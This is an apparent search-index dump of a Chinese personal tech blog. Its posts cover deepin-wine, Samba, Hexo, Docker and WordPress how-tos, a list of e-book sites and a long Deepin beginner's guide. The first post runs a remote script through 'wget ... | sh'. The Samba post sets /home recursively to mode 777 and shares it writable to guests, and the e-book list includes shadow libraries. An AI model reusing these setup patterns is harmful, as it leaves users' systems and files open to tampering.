[{"title":"其他发行版安装deepin软件包","url":"/20210516/b1fc812f7449/","content":"\n运行命令：\n\n```shell\nwget -O- https://deepin-wine.i-m.dev/setup.sh | sh\nsudo apt install deepin.com.wechat\n```\n\n安装后可能会出现界面中文字体显示方块的问题，解决方案如下：\n\n```shell​\n$ sudo apt-cache search wqy \nfonts-wqy-microhei - Sans-serif style CJK font derived from Droid\nfonts-wqy-zenhei - \"WenQuanYi Zen Hei\" A Hei-Ti Style (sans-serif) Chinese font\nxfonts-wqy - WenQuanYi Bitmap Song CJK font for X\n# 安装上面三个字体\nsudo apt install fonts-wqy-microhei\n```\n\n","tags":["deepin"],"categories":["日常"]},{"title":"电子书网站大全","url":"/20210516/49241dee71b7/","content":"\n|**网站名称**|**地址**|**简介**|**语言**|**推荐指数**|\n|----------------------|:-----------------------------------------------------------|------------------------------------------------------------|---------|------------|\n|BookYards|https://www.bookyards.com/en/welcome|主要面向教师的门户网站，免费提供，教辅资料最多。|英语|★★★|\n|搬书匠|http://www.banshujiang.cn/|主要提供编程类书籍的下载|中文|★★★|\n|Z-Library|https://z-lib.org/|无|英语|★★★★|\n|Iread|http://www.iread.cf/|网站不对外搜索引擎开放，站内的资源只能通过站内搜索搜到，要登录|中文|★★★|\n|我爱书籍|http://www.52book.me/|分类详细，书还算比较齐全|中文|★★★|\n|伴读|https://www.bandubook.com/|一个电子书百度云资源专搜网站|中文|★★★|\n|书享家|http://shuxiangjia.cn/|整合了上百个电子书下载网站|中文|★★★|\n|鸠摩搜索|https://www.jiumodiary.com/|强推！专业搜书的聚合搜索引擎|中文/英文|★★★★★|\n|每日书单|https://shudan.vip/|主页界面不错，分类放置资源的形式很适合不知道看什么书的人随便逛逛。|中文|★★★★★|\n|ePUBee电子书库|http://cn.epubee.com/books/|电子书版本、格式都很多，可以一键添加进网站个人账户，再进行下载。|中文|★★★★|\n|Z-Library|https://z-lib.org/|喜欢看英文原版的推荐使用，下载的电子书是mobi、epub格式。|英语|★★★★|\n|LibraryGenesis|http://gen.lib.rus.ec/|功能很强大的下载网站，收录各大下载网站，|英语|★★★★★|\n|ProjectGutenberg|http://www.gutenberg.org/ebooks/4351|对电子书的分类非常细致，但似乎电子书比较旧|英语|★★★|\n|LibgenOnlineLibrary|https://libgen.pw/search?q=A+brief+history+of+humankind|很简单直接的下载网站，电子书版本多，下载也比较方便|英语|★★★★|\n|文叔叔|https://www.wenshushu.cn/about|用来分享电子书非常方便，当然你也可以分享其它资源|中文|★★★★★|\n|BookSC|http://booksc.org/|无|英语|★★★|\n|苦瓜书盘|https://kgbook.com/|和我的小书屋差不多，现仅提供epub下载|中文|★★★★|\n|走读派|http://zoudupai.com/|kindle电子书资源|中文|★★★★|\n|西林街|https://xilinjie.cc/|聚合全网各种来源并分类，也是搜索引擎，不止有电子书，期刊、报纸等都可以搜索。|中文|★★★|\n|众人搜索网|http://www.renrensousuo.com/|除了电子书，一些学习资料、文献也可以搜到，功能比较多。|中文|★★★|\n|周读|http://www.ireadweek.com/|无|中文|★★★|\n|DigiLibraries|https://digilibraries.com/|英文下载，适合kindle|英语|★★★★|\n|书格|https://shuge.org/|可以看到一些旧典籍，很有格调的网站|中文|★★★|\n|蚂蚁搬书|http://www.mybanshu.com/|KindleMate官方网站，阅读极客的聚集地|中文|★★★★|\n|好读|http://www.haodoo.net/|无|中文|★★★|\n|kindle漫画|http://www.kindlecomic.net/|高清kindle格式漫画下载|中文|★★★★|\n|古籍馆|https://www.gujiguan.com/|中国最大的古籍图书馆|中文|★★★|\n|亚马逊免费kindle电子书|https://www.amazon.cn/Kindle免费电子书/b?node=116175071|无|中文/英文|★★★★|\n|OpenLibrary|https://openlibrary.org/|英文原版书的免费电子资源|英语|★★★★|\n|Manybooks|http://manybooks.net|大部分英文原版书都是免费的|英语|★★★|\n|亿年书海|http://www.inien.com/w/#/Index|支持不同尺寸、格式的电子书下载|中文|★★★|\n|掌上书苑|https://www.soepub.com/|下载需要书币，电子书可以推送到kindle|中文|★★★|\n|七彩英语|http://www.qcenglish.com/|英文原版书下载|英语|★★★|\n|kindleshare|https://kindleshare.cn/|无|中文|★★★|\n|mlook|https://www.mlook.mobi/member/login|要登录|英语|★★★|\n|书单网|https://www.shudan.vip|网站收录了30多个电子书网站的下载资源|中文|★★★★|\n|Mobilism|https://forum.mobilism.org/viewforum.php?f=19|英文原版书下载，推荐|英语||\n","tags":["电子书"],"categories":["日常"]},{"title":"ubuntu 20.04 安装配置Samba服务","url":"/20210516/84e50033090b/","content":"\n文章转自：https://blog.csdn.net/mvp_Dawn/article/details/105847485\n\n## 1. 安装Samba服务\n```shell\nsudo apt-get install samba samba-common\n```\n\n如果安装失败，请检查你的网络，确认linux可以访问互联网，若可以联网请尝试更换ubuntu镜像源，桌面版直接在软件和更新中配置，服务器版百度上很多\n\n## 2. 配置需要共享的目录\n\n改变需要共享目录的权限，让其他人可以更改文件和目录，以/home为例（若多人使用同一服务器建议在每个用户家目录单独共享，不建议共享整个home目录，防止误操作删除他人文件）\n\n```shell\n$ sudo chmod 777 /home/ -R\n```\n\n## 3. 添加samba用户\n\n添加samba用户，用于其他人或设备认证，这里添加的用户需要在系统账号中存在，否则添加失败\n\n```shell\ndwan@ubuntu20:~/桌面$ sudo smbpasswd -a dwan\nNew SMB password:\nRetype new SMB password:\nAdded user dwan.\n```\n\n## 4. 配置samba\n\n先备份`sudo cp /etc/samba/smb.conf /etc/samba/smb.conf.bak`，以防改错，修改配置文件时建议养成备份的好习惯，改错了还能恢复，`sudo vim /etc/samba/smb.conf` 修改配置，添加共享，可直接加到文件尾\n\n```shell\n[home] #共享名，该共享标签，可随意取，该名字为在其他电脑上看到的共享名\n    comment = home directories #该共享描述\n    path = /home/  #共享路径\n    public = yes   #指定该共享是否允许guest账户访问\n    writable = yes #writable用来指定该共享路径是否可写\n    workgroup = DAWN #设定 Samba Server 所要加入的工作组或者域\n```\n\nworkgroup 根据windows工作组来确定，右键我的电脑（win10为此电脑）->属性  工作组，该选项有的版本需要配置，有的版本不需要，若访问不了可检查一下该配置，更多配置详见samba配置详解\n\n![20200429205949812](20200429205949812.png)\n\n## 5. 重启samba服务\n\n```shell\nsudo service smbd restart\n```\n\n若找不到服务可尝试如下方法，不过得具体看，有的版本路径不是/etc/init.d/samba，比如我的为/etc/init.d/samba-ad-dc，可以看对应路径是啥，决定用哪个命令\n\n```shell\nsudo /etc/init.d/samba restart\n#sudo /etc/init.d/samba-ad-dc restart\n```\n\n## 6. 在Windows中访问samba服务\n\n在Windows文件管理器中输入`\\\\linux ip` 便可以看到linux samba服务共享的文件夹\n\n![20200429212054291](20200429212054291.png)\n\n## 7. 将共享路径映射为Windows磁盘（非必须）\n\n若经常使用的共享，可直接映射为Windows的磁盘，不用每次都输ip，但linux ip变了需要重新映射，所以建议将linux ip设为固定ip\n\n我的电脑 ->右键 ->映射网络驱动器，文件夹输入框输入\\\\linux ip\\共享名，不能直接输ip，一定要加上共享名，点击完成\n\n![20200429212606612](20200429212606612.png)\n\n接下来就可以在我的![20200429212828636](20200429212828636.png)电脑里看到映射的网络磁盘了\n\n\n\n接下来你就可以在Windows上编写代码，然后在linux下编译验证了\n\n \n\n引用：\n\nhttps://blog.csdn.net/weixin_40806910/article/details/81917077\n\n","tags":["samba"],"categories":["运维"]},{"title":"Hexo使用攻略-添加分类及标签","url":"/20210516/c11b8784ab95/","content":"\n文章转自: https://www.cnblogs.com/hankleo/p/11606224.html\n\n## 创建“分类”选项\n### 生成“分类”页并添加tpye属性\n打开命令行，进入博客所在文件夹。执行命令\n\n```shell\nhexo new page categories\n```\n\n成功后会提示：\n```\nINFO  Created: ~/Documents/blog/source/categories/index.md\n```\n根据上面的路径，找到index.md这个文件，打开后默认内容是这样的：\n```\n---\ntitle: 文章分类\ndate: 2017-05-27 13:47:40\n---\n```\n添加type: \"categories\"到内容中，添加后是这样的：\n```\n---\ntitle: 文章分类\ndate: 2017-05-27 13:47:40\ntype: \"categories\"\n---\n```\n\n保存并关闭文件。\n\n### 给文章添加`categories`属性\n\n打开需要添加分类的文章，为其添加`categories`属性。下方的`categories: web前端`表示添加这篇文章到`web前端`这个分类。\n\n注意：hexo一篇文章只能属于一个分类，也就是说如果在“- web前端”下方添加“-xxx”，hexo不会产生两个分类，而是把分类嵌套（即该文章属于 “- web前端”下的 “-xxx ”分类）。\n\n```\n---\ntitle: jQuery对表单的操作及更多应用\ndate: 2017-05-26 12:12:57\ncategories: \n- web前端\n---\n```\n\n至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。\n当然，只有添加了categories: xxx的文章才会被收录到首页的“分类”中。\n\n## 创建“标签”选项\n### 生成“标签”页并添加tpye属性\n打开命令行，进入博客所在文件夹。执行命令\n\n```shell\nhexo new page tags\n```\n\n成功后会提示：\n```\nINFO  Created: ~/Documents/blog/source/tags/index.md\n```\n根据上面的路径，找到`index.md`这个文件，打开后默认内容是这样的：\n\n```\n---\ntitle: 标签\ndate: 2017-05-27 14:22:08\n---\n``` \n添加type: \"tags\"到内容中，添加后是这样的：\n\n```\n---\ntitle: 文章分类\ndate: 2017-05-27 13:47:40\ntype: \"tags\"\n---\n```\n\n保存并关闭文件。\n\n### 给文章添加“tags”属性\n打开需要添加标签的文章，为其添加`tags`属性。下方的`tags`:下方的`- jQuery-表格-`表单验证就是这篇文章的标签了\n\n```\n---\ntitle: jQuery对表单的操作及更多应用\ndate: 2017-05-26 12:12:57\ncategories: \n- web前端\ntags:\n- jQuery\n- 表格\n- 表单验证\n---\n```\n\n至此，成功给文章添加分类，点击首页的“标签”可以看到该标签下的所有文章。\n 当然，只有添加了`tags: xxx`的文章才会被收录到首页的“标签”中。\n","tags":["Hexo"],"categories":["运维"]},{"title":"Hexo插入本地图片","url":"/20210515/30fb6e5d076a/","content":"\n## Hexo引入本地图片\nHexo本身已经可以插入本地图片，但是其使用的并非我所熟悉的markdown语法：\n\n### 文章资源文件夹\n对于那些想要更有规律地提供图片和其他资源以及想要将他们的资源分布在各个文章上的人来说，Hexo也提供了更组织化的方式来管理资源。这个稍微有些复杂但是管理资源非常方便的功能可以通过将 `config.yml` 文件中的 `post_asset_folder` 选项设为 `true` 来打开。\n\n```yml\n# _config.yml\npost_asset_folder: true\n```\n当资源文件管理功能打开后，Hexo将会在你每一次通过 `hexo new [layout] <title>` 命令创建新文章时自动创建一个文件夹。这个资源文件夹将会有与这个文章文件一样的名字。将所有与你的文章有关的资源放在这个关联文件夹中之后，你可以通过相对路径来引用它们，这样你就得到了一个更简单而且方便得多的工作流。\n\n### 相对路径引用的标签插件\n通过常规的 markdown 语法和相对路径来引用图片和其它资源可能会导致它们在存档页或者主页上显示不正确。在Hexo 2时代，社区创建了很多插件来解决这个问题。但是，随着Hexo 3 的发布，许多新的标签插件被加入到了核心代码中。这使得你可以更简单地在文章中引用你的资源。\n\n```\n{% asset_path slug %}\n{% asset_img slug [title] %}\n{% asset_link slug [title] %}\n```\n\n比如说：当你打开文章资源文件夹功能后，你把一个 example.jpg 图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法 `![](example.jpg)` ，它将不会出现在首页上。（但是它会在文章中按你期待的方式工作）\n\n正确的引用图片方式是使用下列的标签插件而不是 markdown ：\n```\n{% asset_img example.jpg This is an example image %}\n```\n\n通过这种方式，图片将会同时出现在文章和主页以及归档页中。\n\n## Hexo使用Markdown语法引入图片\n\n`Hexo-render-marked 3.1.0`引入了一个新的使用Markdown语法引入图片，而不需要使用asset_img标签插件的方式。通过在_config.yml中配置：\n```yml\n# _config.yml\npost_asset_folder: true\nmarked:\n  prependRoot: true\n  postAsset: true\n```\n\n一旦启用，本地图片会被自动解析到其实际的路径下，如`image.jpg`位于`/2020/01/02/foo/image.jpg`下，表明它是文章`/2020/01/02/foo/`的图片，那么`![](image.jpg)`会被渲染成`<img src=\"/2020/01/02/foo/image.jpg\">`\n\n以上是Hexo官方文档的内容，本人在`_config.yml`中配置了\n\n```yml\nnew_post_name: \\[:year:month:day]:title.md # File name of new posts\n```\n经过验证，通过 `hexo new [layout] <title>`命令创建的文章时，会自动创建一个与markdown文件同名的文件夹用于存储图片，引用本地图片时，将图片存放在这个文件夹，只需通过`![](image.jpg)`引用即可。","tags":["Hexo"],"categories":["运维"]},{"title":"Docker新手入门","url":"/20210403/26d5932fd86e/","content":"\n## 1. Docker是什么？\n\nDocker 是一个开源的应用容器引擎，让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何主流操作系统上，也可以实现虚拟化。\n\n## 2. Docker解决什么问题？\n\n软件开发阶段在开发者的设备上往往开发环境都是完整的，甚至“多余”的，然而：\n\n- 在另一台机器（比如测试）上环境往往不同（软件、版本）\n- 在生产服务器需要最小限度的环境配置\n\nDocker可以在应用的层面上打包其所有的依赖并和操作系统实际的环境进行隔离，避免更改、污染操作系统本身的配置、文件或干扰其他进程。\n\n## 3. Docker与虚拟机？\n\nDocker容器不是模拟一个完整的操作系统，而是对进程进行隔离。或者说，在正常进程的外面套了一个保护层。对于容器里面的进程来说，它接触到的各种资源（文件系统、网络）都是虚拟的，从而实现与底层系统的隔离。\n\nDocker容器无需运行一个完整的操作系统，从而最大限度地降低对硬件资源的占用。\n\n![img](image-20200923085030183.png)\n\n## 4. Docker的安装与基本使用\n\n### 4.1 安装\n\nDocker安装请根据服务器操作系统选择相应的安装方法：\n\nhttps://docs.docker.com/engine/install/\n\n### 4.2 使用\n\n在我的个人服务器上曾今部署过为知笔记的私有服务端，服务端就是以docker镜像的方式提供的;\n\n[为知笔记官方部署教程](https://www.wiz.cn/zh-cn/docker)\n\n官方教程中将容器的80端口映射到了本地机器的80端口，但是本人服务器还部署了nginx服务器的3个站点，因此本人将本地的8080端口映射到容器的80端口，并在nginx中配置一个反向代理来访问该为知笔记的docker容器。\n\n### 4.3 子目录的反向代理\n\n为知笔记的docker镜像无法代理到某个域名的子目录下，需要独立的域名，可能其他应用可以支持，这里本人不是很清楚。以下是为知笔记的回复：\n\n![img](image-20200923090955672-1.png)\n\n## 5. Docker命令基础\n\n以下命令介绍均以Linux平台下，windows平台的docker应该也是差不多的。\n\n**注意：** docker在大多数情况下需要root或管理员权限，请适时增加sudo或以管理员身份打开命令行。\n\n- 从官方源中拉取镜像：\n\n```\ndocker image pull <image name>\n```\n\n- 查看本机镜像：\n\n```\ndocker image ls\n```\n\n- 运行一个镜像：\n\n```\ndocker container run <image name>\n```\n\n`docker container run`命令会从 image 文件，生成一个正在运行的容器实例。一个镜像相当于一个模板，可以创建运行多个容器。\n\n**注意:** `docker container run`命令如果发现本地没有指定的 image 文件，就会从仓库自动抓取。因此，前面的`docker image pull`命令并不是必需的步骤。\n\n- 查看正在运行的容器\n\n```\ndocker container ls\n```\n\n- 查看所有容器（含停止的容器）\n\n```\ndocker container ls -all\n```\n\n- 停止一个容器：\n\n一些容器会在运行结束后停止，但大多数不会，因为它们提供的是一项持续的服务。停止这些容器就需要：\n\n```\ndocker container kill <Container ID>\n```\n\n- 删除容器\n\n容器停止后还会保留容器文件，占据硬盘空间，如果需要可以将其删除\n\n```\ndocker container rm <Container ID>\n```\n\n## 6. 制作docker镜像\n\n本人由于是完全的业余折腾了下，还没到必须要制作一个docker的程度，我找了几个入门教程，希望对你有所帮助：\n\n#### 制作docker镜像\n\n- 请参考“**十、实例：制作自己的 Docker 容器**”：[Docker 入门教程](http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html)\n- 较详细的dockerfile配置说明：[Docker Dockerfile](https://www.runoob.com/docker/docker-dockerfile.html)**注：**配置可以关注`COPY`,`CMD`,`ENTRYPOINT`,`ENV`,`VOLUME`,`EXPOSE`,`USER`命令配置\n\n### 微服务与docker compose\n\n对于一些较为大型或需要一定部署灵活性的需求，一般来说可以将语言环境如php，python和数据库等设施分开，分别运行在不同的docker容器中，教程可参考：\n\n- [Docker 微服务教程](http://www.ruanyifeng.com/blog/2018/02/docker-wordpress-tutorial.html)\n- [Docker Compose](https://www.runoob.com/docker/docker-compose.html)","tags":["Linux","Docker","入门教程"],"categories":["运维"]},{"title":"如何在 Windows 上查看 HEIC 格式照片","url":"/20200801/a7b980f2a11e/","content":"   \n\nwin10系统已经支持heic格式，应用商店下载即可：\n\n**下载**\n\n- [**HEIF/HEIC扩展库**](https://www.microsoft.com/en-us/p/heif-image-extensions/9pmmsr1cgpwg)\n- [**HEVC视频编解码库**](https://www.microsoft.com/en-us/p/hevc-video-extensions-from-device-manufacturer/9n4wgh0z6vhq)\n\nHEVC解码器在国区是收费的，7块钱，但是在美区是免费的，所以直接提供了一个美区的链接\n\n","tags":["Windows"],"categories":["日常"]},{"title":"手动升级WordPress","url":"/20200730/c5414a7081d2/","content":"  \n\n1. 备份Wordpress资料及数据库，强烈建议，为安全起见。\n2. 下载最新版的Wordpress，切记进入Wordpress官网下载。\n3. 删除主机上的wp-includes和wp-admin目录。\n4. 把解压在本地电脑的 WordPress 文件夹中除了wp-content目录外的所有文件都上传并覆盖到你博客主机相对应的位置。遇到是否覆盖时，选择全部覆盖就是了。\n5. 运行 `http://你的博客地址/wp-admin/upgrade.php`，执行升级","tags":["WordPress"],"categories":["运维"]},{"title":"Deepin 入门指南","url":"/20200605/a9d1c1bbb55d/","content":" \n\n## 1. 简介\n\n当前的大环境下，不少单位可能会面临无法通过正式渠道获得windows操作系统和相应支持的情况。一些单位或个人已经转向国产操作系统，比如ubuntu kylin（麒麟）、deepin（深度）等。比如华为笔记本提供了预装Linux的版本，预装的就是Deepin。Kylin、deepin、ubuntu等都是Debian系的Linux发行版（Debian也是一个Linux发行版本），在目前我的使用体验来说，和Ubuntu的体验没有什么大的区别，你可以使用Ubuntu的教程或者文档，但是深度提供了专门本地化的软件商店和桌面环境，还提供了一些Windows 软件的wine打包版本，使得新手能更方便的安装和使用。\n\n对Linux新手：请注意，所有Windows下的exe可执行程序，都不能在Linux平台下直接运行，部分程序可以使用wine模拟器来运行，但请注意，即便有wine模拟器，Linux下能运行的Windows程序依然不多。\n\n## 2. 适用人群\n\n最低能力配置：\n\n- 愿意尝试新东西\n- 有阅读文档并尝试解决问题的耐心和时间\n- 知道自己电脑的操作系统版本、了解32位/64位操作系统以及自己电脑的硬件是否兼容\n- Windows系统下熟练管理文件和软件\n\n推荐能力配置：\n\n- 对软件操作有较为抽象的步骤概念，可以使用不同界面的软件完成相似的任务（例如在WPS和MS Office间可无压力切换）\n- 英文文档阅读能力\n- 梯子\n- 基础cmd或powershell命令，如`cd`、`mkdir`、`ls`等\n\n当然如果你有Ubuntu或Debian或者其他发行版的使用经验，那么你**不需要**这个指南。\n\n## 3. 系统安装\n\nU盘安装系统与Windows基本无异：用[rufus](https://rufus.ie/)或其他U盘启动制作工具将iso镜像刻录到U盘中，然后重启，在BIOS中将第一启动项更改为U盘（或者相应的UEFI分区），开机按提示设置用户名、密码然后等待安装完成即可。详细安装教程可见[官方教程](https://www.deepin.org/installation/)\n\n注意：安装向导询问安装位置时，请不要自行分区和设置挂载点，直接选择全盘安装到一整块不小于40GB的硬盘中，后续我们再涉及磁盘管理的问题。\n\n## 4. 基本GUI界面使用\n\nGUI = Graphical User Interface，即图形用户交互界面，与之相对的是字符界面，只能输入命令执行任务。Deepin的UI界面与Windows有较大的差距，但是请不要慌，他们的基本操作逻辑大致相同：\n\n- 双击打开/右键菜单\n- 删除文件到回收站/从回收站恢复文件\n- 设置界面更接近手机的设置界面\n- ……\n\n事实上，Deepin的设置等界面其实更接近安卓或者iOS系统，UI界面的操作方法都是很简单的，当然右键菜单的内容比Windows上要少一些，其他的一些不好找的设置可以参考官方用户手册：https://wiki.deepin.org/\n\n## 5. 文件结构基本逻辑\n\n### 5.1 根目录的概念\n\n前面安装系统时安装向导会询问系统的安装位置，官方教程中提到了根目录：`/`。请注意，在操作系统中，目录=文件夹，请注意这一措辞的变化。\n\n与Windows的文件结构不同的是，无论你有多少硬盘、分了多少分区，所有的目录都在根目录下，我们在Windows下熟悉的诸如**C盘**，**D盘**等盘符的概念，在Linux操作系统中是不存在的，不同的分区和硬盘都是以目录（挂载点）的形式在文件系统中管理，例如：我们可以将C盘理解成 **根目录-C目录**：\n\n```\n/\n|\n+----C/\n|\n+----D/\n|\n+----E/\n|\n+----F/\n```\n\n### 5.2 家目录的概念\n\n家目录就是/home目录，系统会默认在这个目录下创建一个与用户名同名的目录，用于存放该用户的所有文件。目录结构如下：\n\n```\n/\n|\n+---- home/\n        |\n        +---<用户名>/\n            |\n            +---文档/\n            |\n            +---音乐/\n            |\n            +---图片/\n            |\n            +---下载/\n            |\n            +---视频/\n            |\n            +---……\n```\n\n请将所有的文件例如文档、照片、视频、软件安装包等内容分类放在你的目录下。默认情况下，新用户只有自己的家目录的写权限，其他文件最多只会有读权限（**请注意**：**删除**也是**写**操作）。\n\n### 5.3 root权限\n\n**注意：** *由于本文面向新手，所以会尽量少介绍命令，此处内容了解即可。*\n\nroot用户、用户组有系统最高的权限，可以无视任何文件权限配置读写文件系统下的任意一个文件或目录，那也就是说拥有“**一键删除一切**”的功能：\n\n![1](1.png)\n\n*（注意：Windows下的Administrator权限是用户能获得的最高权限，并不是系统的最高权限，不能和root类比）*\n\n在系统安装时添加的第一个用户会默认加入root用户组，直接执行命令时仅仅是以用户本身的权限执行。如果需要root权限，就在命令前加上sudo，然后会提示输入用户密码，以root用户的身份执行相应的命令。\n\n请注意，只有加入了root用户组的用户才能借用root权限。正是因为root权限几乎是“无可阻挡”，以root身份执行命令时请务必谨慎。\n\n文件的权限可以使用[chmod](https://man.linuxde.net/chmod)更改，大多数情况下，需要借用root权限，即使用`sudo chmod ...`\n\n## 6. 压缩文件与解压缩\n\n### 6.1 文件格式\n\n请注意，在Linux平台下源码包的打包压缩格式常常为`.tar.gz`，其他文件的压缩包多为`zip`格式。另外虽然Deepin也添加了7z、rar等格式的支持，请在打包压缩文件时尽量选择`zip`或`tar.gz`/`tar.bz2`格式\n\n### 6.2 压缩和解压缩\n\ndeepin的压缩和解压非常简单，与Windows相同，在压缩包上右键-压缩/解压，按提示选择保存位置即可。\n\n## 7. 软件的安装与卸载：\n\n如同在简介中提到的，你下载一个Windows的程序到Linux平台下会发现打不开/无法运行，Linux平台的软件包是通过与windows完全不同的方式安装的。请通过以下方式安装软件：\n\n### 7.1 软件商店\n\n第8节中的软件可以首先尝试在深度自带的应用商店中搜索，尝试安装前，请先到设置中更新软件信息，更新完成后才能正常安装，否则会报错。\n\n优先安装备注了Linux版的软件，而不是wine版本的，网页版最不推荐安装，有些软件是打包浏览器的网页版本， 没有备注，这种只能是下载后使用时才能发现。\n\n### 7.2 下载deb包\n\n并不是所有的软件都收录到了深度的软件商店中，另外一些软件需要我们自行下载安装包，请注意即便同样是Linux平台，不同格式的软件包也不是通用的，Debian系发行版的软件安装包都是`.deb`后缀，这也是最常见的一种格式，以网易云音乐为例：\n\n![img](2.png)\n\n其下载客户端的页面提供了Linux版本的下载，选择自己对应的发行版下载后，双击安装即可。无论是双击deb安装还是直接在软件商店内下载的软件都可以直接在已安装软件列表中一键卸载。\n\n### 7.3 apt/apt-get/dpkg命令\n\n**注意：** *7.3及后续的安装方法了解即可*\n\n上述通过商店安装软件实际上就是用过apt命令安装了对应的安装包，apt又是通过调用dpkg进行解包、安装，如果你需要安装一个名为smartmontools （硬盘检测）的软件包，那么，你只需要打开终端或者按下Ctrl+Alt+T调出终端，然后输入命令：\n\n> sudo apt install smartmontools -y\n\n回车，终端会提示输入密码，按要求输入你的密码然后回车后就会进行下载和安装。不过你能使用apt安装一个软件的前提是，软件开发者已经在apt的源仓库中已经提交了对应的软件包，和商店的其实是很相似的。\n\n卸载软件只需要运行：\n\n> sudo apt remove <软件包名> -y\n\n输入密码，回车确认即可。\n\n**那么我们能不能用命令安装自己下载的软件包呢？**答案是可以的。我们以网易云音乐（假设文件名为：`netease_music.deb`）为例，在官网下载了安装包后，打开到安装包所在的目录，然后右键-在终端中打开，然后输入\n\n> sudo apt install ./netease_music.deb -y\n\n回车，输入密码再回车即可安装\n\n当然，也可以使用`dpkg`命令进行安装：\n\n> sudo dpkg -i ./netease_music.deb -y\n\n那么`apt-get`又是什么命令呢？`apt-get`基本等同于`apt`命令，后者更新，我们应使用更新的版本。\n\n注意：由于商店和`apt`/`apt-get`命令都使用了`dpkg`命令，如果你正在安装或更新deb软件包，它就会被加锁，在其结束安装或更新前，你将不能再打开一个安装或更新过程。软件商店安装失败多半是因为系统在后台运行了一个更新过程，所以，安装失败的时候请先到设置里确认更新是否在运行中。\n\n### 7.4 脚本安装\n\n部分软件不能通过apt安装，也没有提供deb包，但是在下载页面提供了一个脚本，我们可以打开终端，直接复制粘贴脚本，回车即可安装，例如zerotier-one（虚拟局域网工具）：\n\n![img](3.png)\n\n注意：有一些通过脚本安装的软件可能不会提供卸载方法或者卸载方法比较复杂，这类软件的安装务必谨慎进行。另外脚本安装的可能是deb包软件，也可能不是，具体请阅读对应软件的安装说明。\n\n### 7.5 其他类型：snap，appimage\n\n- Snap：Snap是Canonical公司（Ubuntu的发行公司）的新一代包管理器，安全方便，部分软件会提供snap包，但它的权限管理比较复杂，初学者请不要尝试安装该类软件包。\n- appimage：部分软件在Linux平台会提供appimage，这种包将其需要的所有依赖软件全部打包在一起，因此通常来说体积会比较大，但是不需要担心任何依赖问题，基本可以做到在任何发行版中，双击即可运行，因此，在没有提供deb包时，可以优先选择appimage格式打包的软件，例如mkvtoolnix就在下载页面提供了appimage：\n\n![img](4.png)\n\n### 7.6 源码安装：\n\n有些软件提供源码包，需要自行编译安装。与一些脚本安装的软件类似，编译安装的软件往往依赖较多的外部软件包，需要手动安装，而且安装文件的步骤多，部分源码包不提供卸载方法，编译源码安装的软件同样不适合新手使用。\n\n如果你有了解`cd` `ls` `mkdir`这类基础命令，可以参考源码包内的安装方法（大多是英文），然后参考[本文](https://blog.sergget.ga/20200418/6a36829358ea/)安装源码包\n\n## 8. windows平台软件的替换\n\n靠前=更推荐，深度提供了部分工具：录屏、截图、分区工具\n\n1. 输入法：搜狗（预装）、Sunpinyin\n2. 浏览器：chrome（预装）、firefox\n3. Office三件套: WPS（预装）（Ubuntu下默认安装的字体和Windows下有很多不同，请自行搜索下载需要的字体）\n4. 邮件客户端：Evolution、Thunderbird（预装）\n5. pdf阅读器：福昕阅读器Linux版、Okular、金山PDF（预装）\n6. 流程图/Visio替代：Dia\n7. 下载：qbittorrent、uget、百度网盘Linux版\n8. 笔记：Evernote(使用第三方linux客户端Nixnote)、为知笔记（会员或[自行部署服务端](https://www.wiz.cn/zh-cn/enterprise-private-cloud.html)）、simplenote\n9. 网页剪辑：pocket扩展+手机端应用\n10. 视频相关：\n    - 播放器：VLC、kodi\n    - 剪辑：kdenlive、shocut\n    - 字幕编辑：subtitle editor\n    - mkv打包和拆包：mkvtoolnix\n    - 视频转码：HandBrake\n    - 录屏：kazam\n    - 3D动画：Blender\n11. 音乐播放器：网易云音乐、VLC、Spotify\n12. 图片和照片：\n    - 相册：shotwell、digikam\n    - PS替代：GIMP\n    - 矢量图：InkScape\n13. CAD：中望CAD Linux版、freeCAD\n14. 虚拟局域网：zerotier-one\n15. 虚拟机：Virtualbox\n16. 梯子：Github上搜索你使用的协议名称+Linux即可，有UI的更好。不要问推荐什么，咱不知道。\n\n## 9. 磁盘分区和管理：\n\n如果你没有在Windows下使用过系统自带分区工具、diskgenius或其他的分区工具，请忽略本节内容，相关需求请联系专业人员处理。\n\n### 9.1 GUI工具：disks\n\nDeepin下使用系统自带的分区工具或者下载disks工具即可，操作其他的分区工具类似。\n\nLinux下常用的文件系统为`ext3`, `ext4`，不能直接使用Windows常见的NTFS文件系统，对于一些小文件需要在Windows和Linux之间频繁切换的U盘可以格式化成`FAT32`格式，这种文件系统在两个平台上都能直接使用，代价是不能存储单个大于4G的文件。\n\n如果一定要使用NTFS文件系统，可以使用如下命令安装软件包：\n\n> sudo apt install ntfs-3g -y\n\n即可挂载NTFS分区\n\n### 9.2 命令行：parted/fdisk+mkfs\n\nLinux平台下更多的使用命令行来对硬盘进行分区和格式化，常用的分区命令：parted、fdisk，格式化工具：mkfs（make file system）\n\n关于这些命令的使用，可以阅读：\n\n- parted命令：https://man.linuxde.net/parted\n- fdisk命令：http://man.linuxde.net/fdisk\n- mkfs命令：https://man.linuxde.net/mkfs\n\n请注意：parted用于gpt分区，fdisk用于mbr分区\n\n### 9.3 挂载点的概念\n\n挂载点是Linux平台与Windows平台对存储资源管理的最大不同点之一，由于Linux平台文件系统始终以根目录作为最初始的目录，如果我们需要使用硬盘的某一个分区，就只能把它作为一个目录添加到Linux的文件系统中，代表这个分区的目录就被我们称作挂载点，为硬盘分区分配一个目录的动作就被称为挂载。\n\n我们存储在挂载点这个目录的所有文件，在物理上就存储在其对应的硬盘分区中。\n\n分区的挂载操作和卸载操作：\n\n- 挂载分区：https://man.linuxde.net/mount\n- 卸载分区：https://man.linuxde.net/umount\n\n**注意**：使用mount命令挂载的分区会在重启后消失，如需要开机就自动挂载，请阅读：https://www.cnblogs.com/qiyebao/p/4484047.html\n\n如果你新增加了一块硬盘，需要将你的家目录转移到该硬盘上，可以参考：https://blog.sergget.ga/20200426/0cad07e5443e/\n\n## 10. 小结\n\n由于Linux教程大多是开篇介绍命令，对于桌面用户非常不友好，所以本文致力于介绍其逻辑，但是即便deepin做了很多本地化和图形化的工作，作为一个Linux系统仍然有很多地方不得不使用命令行/字符界面，作为桌面用户仍然需要适时地学习相关的命令。网上有很多Linux教程，可以参考视频教程：https://www.imooc.com/course/programdetail/pid/45选择性地学习。\n\n最后请善用搜索引擎（推荐必应，国内搜索引擎真是一言难尽）！\n\n## 11. 